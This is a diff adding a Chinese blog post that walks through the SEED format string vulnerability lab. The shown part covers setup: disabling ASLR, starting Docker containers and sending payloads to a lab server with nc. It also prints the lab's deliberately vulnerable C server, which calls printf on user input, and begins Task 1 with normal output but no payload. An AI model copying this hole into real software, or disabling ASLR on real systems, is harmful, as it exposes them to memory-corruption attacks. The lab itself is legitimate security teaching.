@@ -1,0 +1,984 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Environment Setup现代操作系统使用地址空间随机化（ASLR）来随机化堆和堆栈的起始地址。这使得猜测确切的地址变得困难; 猜测地址是格式字符串攻击的关键步骤之一。为了简化这个lab，我们使用以下命令关闭地址随机化: 1$ sudo sysctl -w kernel.randomize_va_space&#x3D;0  The Vulnerable Program在server-code目录执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEED-lab：Format String Vulnerability Lab">
+<meta property="og:url" content="http://gls.show/p/df8f6639/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="Environment Setup现代操作系统使用地址空间随机化（ASLR）来随机化堆和堆栈的起始地址。这使得猜测确切的地址变得困难; 猜测地址是格式字符串攻击的关键步骤之一。为了简化这个lab，我们使用以下命令关闭地址随机化: 1$ sudo sysctl -w kernel.randomize_va_space&#x3D;0  The Vulnerable Program在server-code目录执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/linux3.jpg">
+<meta property="article:published_time" content="2023-04-07T15:43:30.017Z">
+<meta property="article:modified_time" content="2023-04-07T15:44:39.440Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/linux3.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SEED-lab：Format String Vulnerability Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SEED-lab：Format String Vulnerability Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-07 23:43" pubdate>
+          2023年4月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          71 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SEED-lab：Format String Vulnerability Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年4月7日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><p>现代操作系统使用地址空间随机化（ASLR）来随机化堆和堆栈的起始地址。这使得猜测确切的地址变得困难; 猜测地址是格式字符串攻击的关键步骤之一。为了简化这个lab，我们使用以下命令关闭地址随机化:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0<br></code></pre></td></tr></table></figure>
+
+<h1 id="The-Vulnerable-Program"><a href="#The-Vulnerable-Program" class="headerlink" title="The Vulnerable Program"></a>The Vulnerable Program</h1><p>在server-code目录执行</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> <br><span class="hljs-built_in">make</span> install <br></code></pre></td></tr></table></figure>
+
+<p>服务器运行在10.9.0.5上，它运行一个带有格式字符串漏洞的32位程序</p>
+<p>在Labsetup文件夹执行</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker-compose <span class="hljs-keyword">build </span><span class="hljs-comment"># Build the container image</span><br>docker-compose up <span class="hljs-comment"># Start the container</span><br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Starting</span> server-<span class="hljs-number">10.9.0.6</span> ... done<br>Attaching to server-<span class="hljs-number">10.9.0.5</span>, server-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure>
+
+<p>在容器中运行shell</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>dockps<br>e17efb105f7d  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">6</span><br><span class="hljs-number">1874</span>c8677f7a  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">5</span><br>[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>docksh e17<br>root<span class="hljs-variable">@e17efb105f7d</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>服务器接受最多1500字节的数据。这个lab中的主要工作是构建不同的有效载荷，以利用服务器中的格式字符串漏洞，这样就可以实现每个任务中指定的目标。如果将有效负载保存在文件中，则可以使用以下命令将有效负载发送到服务器。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> cat &lt;<span class="hljs-keyword">file</span>&gt; | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure>
+
+<p>易受攻击的程序format. c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 10 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target = <span class="hljs-number">0x1122334455667788</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the rbp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(msg);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// This function is used to insert a stack frame between main and myprintf.</span><br><span class="hljs-comment">// The size of the frame can be adjusted at the compilation time. </span><br><span class="hljs-comment">// The function itself does not do anything.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>32位简略版本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br>    <span class="hljs-built_in">printf</span>(msg);<span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h1><p>向服务器提供一个输入，这样当服务器程序试图打印 myprintf ()函数中的用户输入时，它就会崩溃</p>
+<p>这是正常的输出：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Got a connection from <span class="hljs-number">10.9.0.1</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Starting format<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The input buffer&#x27;s address:    <span class="hljs-number">0</span>xffffd<span class="hljs-number">300</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The secret message&#x27;s address:  <span class="hljs-number">0</span>x<span class="hljs-number">080</span>b<span class="hljs-number">4008</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s address: <span class="hljs-number">0</span>x<span class="hljs-number">080</span>e<span class="hljs-number">5068</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Waiting for user input ......<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Received <span class="hljs-number">6</span> bytes.<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Frame Pointer (inside myprintf):      <span class="hljs-number">0</span>xffffd<span class="hljs-number">228</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (before): <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | hello<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | (^_^)(^_^)  Returned properly (^_^)(^_^)<br></code></pre></td></tr></table></figure>
+
